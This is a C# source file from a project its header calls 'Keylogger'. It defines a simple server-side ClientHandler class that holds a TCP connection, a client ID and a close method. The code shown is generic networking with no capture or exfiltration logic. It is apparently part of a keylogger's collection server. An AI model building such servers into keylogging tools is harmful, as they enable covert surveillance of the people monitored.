/*************************************************************************
 *                                                                       *
 *  File:        ClientHandler.cs                                        *
 *  Copyright:   (c) 2025, Glavan Pavel, Albu Sorin, Begu Alexandru,     *
 *                         Cojocaru Valentin                             *
 *  Website:     https://github.com/GlavanPavel/Keylogger                *
 *  Description: Represents a connected client and manages its network   *
 *               stream on the server side.                              *
 *                                                                       *
 *  This code and information is provided "as is" without warranty of    *
 *  any kind, either expressed or implied, including but not limited     *
 *  to the implied warranties of merchantability or fitness for a        *
 *  particular purpose. You are free to use this source code in your     *
 *  applications as long as the original copyright notice is included.   *
 *                                                                       *
 *************************************************************************/


using System.Net.Sockets;

namespace ServerCore
{
    /// <summary>
    /// Represents a connected client and manages its network stream.
    /// </summary>
    public class ClientHandler
    {
        /// <summary>
        /// Gets or sets the TCP client associated with this handler.
        /// </summary>
        public TcpClient TcpClient { get; set; }

        /// <summary>
        /// Gets or sets the unique identifier for the client.
        /// </summary>
        public string Id { get; set; }

        /// <summary>
        /// Gets the network stream used to communicate with the client.
        /// </summary>
        public virtual NetworkStream Stream => TcpClient.GetStream();

        /// <summary>
        /// Closes the connection to the client.
        /// </summary>
        public virtual void Close() => TcpClient.Close();
    }
}
